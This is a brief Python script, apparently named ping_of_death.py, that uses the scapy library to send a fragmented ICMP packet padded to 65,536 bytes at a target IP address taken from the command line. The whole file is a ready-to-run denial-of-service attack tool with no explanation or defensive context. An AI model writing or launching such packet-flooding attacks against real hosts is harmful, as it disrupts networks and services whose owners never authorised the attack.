import sys
from scapy.all import *

def start_ping_of_dead_attack(targetIP):
  send( fragment(IP(dst=targetIP)/ICMP()/("X"*65536)) )

if __name__ == '__main__':
    argv_len = len(sys.argv)
    if  argv_len < 2:
        print("Invalid input arguments")
        print("python ping_of_death.py <targetIP>")
    else:
        targetIP = sys.argv[1]
        start_ping_of_dead_attack(targetIP)